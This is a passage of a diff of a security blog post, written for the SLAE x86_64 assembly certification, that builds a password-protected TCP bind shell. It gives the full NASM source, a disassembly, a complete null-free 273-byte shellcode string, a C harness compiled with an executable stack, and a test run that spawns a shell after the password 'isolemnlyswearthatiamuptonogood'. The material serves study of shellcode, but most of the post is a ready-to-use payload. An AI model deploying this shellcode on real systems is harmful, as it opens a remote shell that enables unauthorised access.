+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; listen(sock, MAX_CLIENTS)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; syscall number 50
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">sil</span>, <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; new = accept(sock, (struct sockaddr *)&amp;client, &amp;sockaddr_len)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; syscall number 43
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">43</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">rsp-1</span>], <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">rsp</span>, <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; store the client socket description 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">r9</span>, <span style="color:#66d9ef">rax</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; close parent
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; duplicate sockets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; dup2 (new, old)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r9</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">33</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">33</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">;mov rsi, 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">33</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">;mov rsi, 2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; ############ asking for password ------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    password:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; sys_write
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">; rax : 1 - write syscall number
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">; rdi : unsigned int fd : 1 for stdout
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">; rsi : const char *buf : password buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">; rdx : size_t count : password size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rdx</span> <span style="color:#75715e">; or cqo??
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rsi</span>, [<span style="color:#66d9ef">rel</span> <span style="color:#66d9ef">ask_pass</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">dl</span>, <span style="color:#ae81ff">21</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; sys_read
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">; rdi : unsigned int fd : 0 for stdin
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">; rsi : char *buf : stack?
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">; rdx : size_t count : how big
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rdx</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rdi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; rax is already zero
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">32</span> <span style="color:#75715e">;password size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">0x0a646f6f676f6e6f</span> <span style="color:#75715e">; \ndoogono  --&gt; \n - new line byte = 0x0a
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">0x7470756d61697461</span> <span style="color:#75715e">; tpumaita
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">0x6874726165777379</span> <span style="color:#75715e">; htraewsy
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">0x6c6e6d656c6f7369</span> <span style="color:#75715e">; lnmelosi
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsp</span>                <span style="color:#75715e">; password buffer pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">rcx</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#ae81ff">32</span>                 <span style="color:#75715e">; 31 bytes for password and 1 byte for newline char
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">rep</span><span style="color:#a6e22e">e</span> <span style="color:#66d9ef">cmpsb</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jne</span> <span style="color:#66d9ef">password</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; ###### ------------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; execve
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; First NULL push
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; push /bin//sh in reverse
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rbx</span>, <span style="color:#ae81ff">0x68732f2f6e69622f</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rbx</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; store /bin//sh address in RDI
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; Second NULL push
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; set RDX
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; Push address of /bin//sh
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rdi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; set RSI
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">; Call the Execve syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">add</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">59</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
+</span></span></code></pre></div><pre tabindex="0"><code>
+shell-bind-password:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000401000 &lt;_start&gt;:
+  401000:	eb 15                	jmp    401017 &lt;main&gt;
+
+0000000000401002 &lt;ask_pass&gt;:
+  401002:	54                   	push   rsp
+  401003:	65 6c                	gs ins BYTE PTR es:[rdi],dx
+  401005:	6c                   	ins    BYTE PTR es:[rdi],dx
+  401006:	20 6d 65             	and    BYTE PTR [rbp+0x65],ch
+  401009:	20 74 68 65          	and    BYTE PTR [rax+rbp*2+0x65],dh
+  40100d:	20 70 61             	and    BYTE PTR [rax+0x61],dh
+  401010:	73 73                	jae    401085 &lt;main+0x6e&gt;
+  401012:	63 6f 64             	movsxd ebp,DWORD PTR [rdi+0x64]
+  401015:	65                   	gs
+  401016:	0a                   	.byte 0xa
+
+0000000000401017 &lt;main&gt;:
+  401017:	48 31 d2             	xor    rdx,rdx
+  40101a:	48 f7 e2             	mul    rdx
+  40101d:	04 29                	add    al,0x29
+  40101f:	40 b7 02             	mov    dil,0x2
+  401022:	40 b6 01             	mov    sil,0x1
+  401025:	0f 05                	syscall 
+  401027:	48 89 c7             	mov    rdi,rax
+  40102a:	48 31 c0             	xor    rax,rax
+  40102d:	50                   	push   rax
+  40102e:	89 44 24 fc          	mov    DWORD PTR [rsp-0x4],eax
+  401032:	66 c7 44 24 fa 11 5c 	mov    WORD PTR [rsp-0x6],0x5c11
+  401039:	c6 44 24 f8 02       	mov    BYTE PTR [rsp-0x8],0x2
+  40103e:	48 83 ec 08          	sub    rsp,0x8
+  401042:	b0 31                	mov    al,0x31
+  401044:	48 89 e6             	mov    rsi,rsp
+  401047:	b2 10                	mov    dl,0x10
+  401049:	0f 05                	syscall 
+  40104b:	b0 32                	mov    al,0x32
+  40104d:	40 b6 02             	mov    sil,0x2
+  401050:	0f 05                	syscall 
+  401052:	b0 2b                	mov    al,0x2b
+  401054:	48 83 ec 10          	sub    rsp,0x10
+  401058:	48 89 e6             	mov    rsi,rsp
+  40105b:	c6 44 24 ff 10       	mov    BYTE PTR [rsp-0x1],0x10
+  401060:	48 83 ec 01          	sub    rsp,0x1
+  401064:	48 89 e2             	mov    rdx,rsp
+  401067:	0f 05                	syscall 
+  401069:	49 89 c1             	mov    r9,rax
+  40106c:	b0 03                	mov    al,0x3
+  40106e:	0f 05                	syscall 
+  401070:	4c 89 cf             	mov    rdi,r9
+  401073:	b0 21                	mov    al,0x21
+  401075:	48 31 f6             	xor    rsi,rsi
+  401078:	0f 05                	syscall 
+  40107a:	b0 21                	mov    al,0x21
+  40107c:	48 ff c6             	inc    rsi
+  40107f:	0f 05                	syscall 
+  401081:	b0 21                	mov    al,0x21
+  401083:	48 ff c6             	inc    rsi
+  401086:	0f 05                	syscall 
+
+0000000000401088 &lt;password&gt;:
+  401088:	48 31 c0             	xor    rax,rax
+  40108b:	48 31 d2             	xor    rdx,rdx
+  40108e:	48 ff c0             	inc    rax
+  401091:	48 89 c7             	mov    rdi,rax
+  401094:	48 8d 35 67 ff ff ff 	lea    rsi,[rip+0xffffffffffffff67]        # 401002 &lt;ask_pass&gt;
+  40109b:	b2 15                	mov    dl,0x15
+  40109d:	0f 05                	syscall 
+  40109f:	48 31 d2             	xor    rdx,rdx
+  4010a2:	48 31 c0             	xor    rax,rax
+  4010a5:	48 31 ff             	xor    rdi,rdi
+  4010a8:	48 89 e6             	mov    rsi,rsp
+  4010ab:	48 83 c2 20          	add    rdx,0x20
+  4010af:	0f 05                	syscall 
+  4010b1:	48 89 e7             	mov    rdi,rsp
+  4010b4:	48 31 f6             	xor    rsi,rsi
+  4010b7:	56                   	push   rsi
+  4010b8:	48 be 6f 6e 6f 67 6f 	movabs rsi,0x0a646f6f676f6e6f
+  4010bf:	6f 6f 64 
+  4010c2:	56                   	push   rsi
+  4010c3:	48 be 61 74 69 61 6d 	movabs rsi,0x7470756d61697461
+  4010ca:	75 70 74 
+  4010cd:	56                   	push   rsi
+  4010ce:	48 be 79 73 77 65 61 	movabs rsi,0x6874726165777379
+  4010d5:	72 74 68 
+  4010d8:	56                   	push   rsi
+  4010d9:	48 be 69 73 6f 6c 65 	movabs rsi,0x6c6e6d656c6f7369
+  4010e0:	6d 6e 6c 
+  4010e3:	56                   	push   rsi
+  4010e4:	48 89 e6             	mov    rsi,rsp
+  4010e7:	48 31 c9             	xor    rcx,rcx
+  4010ea:	80 c1 20             	add    cl,0x20
+  4010ed:	f3 a6                	repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
+  4010ef:	75 97                	jne    401088 &lt;password&gt;
+  4010f1:	48 31 c0             	xor    rax,rax
+  4010f4:	50                   	push   rax
+  4010f5:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f2f6e69622f
+  4010fc:	2f 73 68 
+  4010ff:	53                   	push   rbx
+  401100:	48 89 e7             	mov    rdi,rsp
+  401103:	50                   	push   rax
+  401104:	48 89 e2             	mov    rdx,rsp
+  401107:	57                   	push   rdi
+  401108:	48 89 e6             	mov    rsi,rsp
+  40110b:	48 83 c0 3b          	add    rax,0x3b
+  40110f:	0f 05                	syscall 
+</code></pre><p>From the output we can verify the null bytes were gone effectively.</p>
+<h3 id="compiling-and-testing-the-shellcode">Compiling and Testing the Shellcode<a hidden class="anchor" aria-hidden="true" href="#compiling-and-testing-the-shellcode">#</a></h3>
+<p>To be easier to compile my shellcode scripts and get the size and the opcodes I&rsquo;ll use the 64-bit version of <code>assembler.sh</code>.</p>
+<blockquote>
+<p>Available in <a href="https://github.com/0xnibbles/slae_x86_64/blob/main/assembler.sh">https://github.com/0xnibbles/slae_x86_64/blob/main/assembler.sh</a></p>
+</blockquote>
+<p>Checking <code>assembler.sh</code> output</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ../../assembler.sh shell-bind-password.nasm                   
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Compiling with NASM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Linking
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting opcodes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Shellcode size: <span style="color:#ae81ff">273</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xeb\x15\x54\x65\x6c\x6c\x20\x6d\x65\x20\x74\x68\x65\x20\x70\x61\x73\x73\x63\x6f\x64\x65\x0a\x48\x31\xd2\x48\xf7\xe2\x04\x29\x40\xb7\x02\x40\xb6\x01\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x89\x44\x24\xfc\x66\xc7\x44\x24\xfa\x11\x5c\xc6\x44\x24\xf8\x02\x48\x83\xec\x08\xb0\x31\x48\x89\xe6\xb2\x10\x0f\x05\xb0\x32\x40\xb6\x02\x0f\x05\xb0\x2b\x48\x83\xec\x10\x48\x89\xe6\xc6\x44\x24\xff\x10\x48\x83\xec\x01\x48\x89\xe2\x0f\x05\x49\x89\xc1\xb0\x03\x0f\x05\x4c\x89\xcf\xb0\x21\x48\x31\xf6\x0f\x05\xb0\x21\x48\xff\xc6\x0f\x05\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\x48\x31\xd2\x48\xff\xc0\x48\x89\xc7\x48\x8d\x35\x67\xff\xff\xff\xb2\x15\x0f\x05\x48\x31\xd2\x48\x31\xc0\x48\x31\xff\x48\x89\xe6\x48\x83\xc2\x20\x0f\x05\x48\x89\xe7\x48\x31\xf6\x56\x48\xbe\x6f\x6e\x6f\x67\x6f\x6f\x64\x0a\x56\x48\xbe\x61\x74\x69\x61\x6d\x75\x70\x74\x56\x48\xbe\x79\x73\x77\x65\x61\x72\x74\x68\x56\x48\xbe\x69\x73\x6f\x6c\x65\x6d\x6e\x6c\x56\x48\x89\xe6\x48\x31\xc9\x80\xc1\x20\xf3\xa6\x75\x97\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
+</span></span><span style="display:flex;"><span>--------------------
+</span></span></code></pre></div><p>No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xeb\x15\x54\x65\x6c\x6c\x20\x6d\x65\x20\x74\x68\x65\x20\x70\x61\x73\x73\x63\x6f\x64\x65\x0a\x48\x31\xd2\x48\xf7\xe2\x04\x29\x40\xb7\x02\x40\xb6\x01\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\x89\x44\x24\xfc\x66\xc7\x44\x24\xfa\x11\x5c\xc6\x44\x24\xf8\x02\x48\x83\xec\x08\xb0\x31\x48\x89\xe6\xb2\x10\x0f\x05\xb0\x32\x40\xb6\x02\x0f\x05\xb0\x2b\x48\x83\xec\x10\x48\x89\xe6\xc6\x44\x24\xff\x10\x48\x83\xec\x01\x48\x89\xe2\x0f\x05\x49\x89\xc1\xb0\x03\x0f\x05\x4c\x89\xcf\xb0\x21\x48\x31\xf6\x0f\x05\xb0\x21\x48\xff\xc6\x0f\x05\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\x48\x31\xd2\x48\xff\xc0\x48\x89\xc7\x48\x8d\x35\x67\xff\xff\xff\xb2\x15\x0f\x05\x48\x31\xd2\x48\x31\xc0\x48\x31\xff\x48\x89\xe6\x48\x83\xc2\x20\x0f\x05\x48\x89\xe7\x48\x31\xf6\x56\x48\xbe\x6f\x6e\x6f\x67\x6f\x6f\x64\x0a\x56\x48\xbe\x61\x74\x69\x61\x6d\x75\x70\x74\x56\x48\xbe\x79\x73\x77\x65\x61\x72\x74\x68\x56\x48\xbe\x69\x73\x6f\x6c\x65\x6d\x6e\x6c\x56\x48\x89\xe6\x48\x31\xc9\x80\xc1\x20\xf3\xa6\x75\x97\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Shellcode Length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(code));
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ret</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Compiling with <code>gcc</code> and executing it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
+</span></span><span style="display:flex;"><span>shellcode.c:7:1: warning: <span style="color:#66d9ef">return</span> type defaults to ‘int’ <span style="color:#f92672">[</span>-Wimplicit-int<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span> ^~~~
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ./shellcode                                                   
+</span></span><span style="display:flex;"><span>Shellcode Length: <span style="color:#ae81ff">273</span>
+</span></span><span style="display:flex;"><span>Tell me the passcode
+</span></span><span style="display:flex;"><span>hsfjdfhgs
+</span></span><span style="display:flex;"><span>Tell me the passcode
+</span></span><span style="display:flex;"><span>isolemnlyswearthatiamuptonogood     
+</span></span><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>edu
+</span></span><span style="display:flex;"><span>$
+</span></span></code></pre></div><p>Oh yeah! The shellcode checks correctly for the right password and spawns a shell!</p>
+<hr>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
+<p><code>Student ID: PA-31319</code></p>
+<p>All the source code files are available on GitHub at <a href="https://github.com/0xnibbles/slae_x86">https://github.com/0xnibbles/slae_x86</a></p>
+<hr>
 
 
   </div>
@@ -284,7 +994,7 @@ Binds to a port; User needs to provide a correct password Executing a shell on i
     </main>
     
 <footer class="footer">
-    <span>&copy; 2022 <a href="https://0xnibbles.github.io/">nibbles</a></span>
+    <span>&copy; 2023 <a href="https://0xnibbles.github.io/">nibbles</a></span>
     <span>
         Powered by
         <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
